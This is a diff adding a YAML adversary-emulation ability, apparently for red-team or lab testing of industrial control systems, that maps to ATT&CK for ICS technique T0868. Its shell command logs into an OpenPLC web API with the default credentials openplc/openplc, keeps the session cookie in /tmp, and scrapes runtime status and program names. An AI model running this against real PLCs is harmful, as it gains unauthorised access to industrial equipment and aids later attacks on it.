@@ -1,0 +1,23 @@
+---
+
+- id: c9d0e1f2-9999-9999-9999-000000000001
+  name: OpenPLC - Detect Operating Mode via API
+  description: |
+    Query the OpenPLC web API to determine current runtime status
+    (running/stopped), active program name, and protocol states.
+  tactic: collection
+  technique_id: T0868
+  technique_name: Detect Operating Mode
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -c /tmp/plc.jar -X POST "http://192.168.95.2:8080/login"
+      -d "username=openplc&password=openplc" -L -o /dev/null &&
+      echo "=== Runtime Status ===" &&
+      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/dashboard" |
+      grep -oP '(Running|Stopped|Program|Status).*?<' | head -5 &&
+      echo "=== Programs ===" &&
+      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/programs" |
+      grep -oP '[0-9]+\.st' | sort -u &&
+      echo "PLC_MODE_DETECTED"
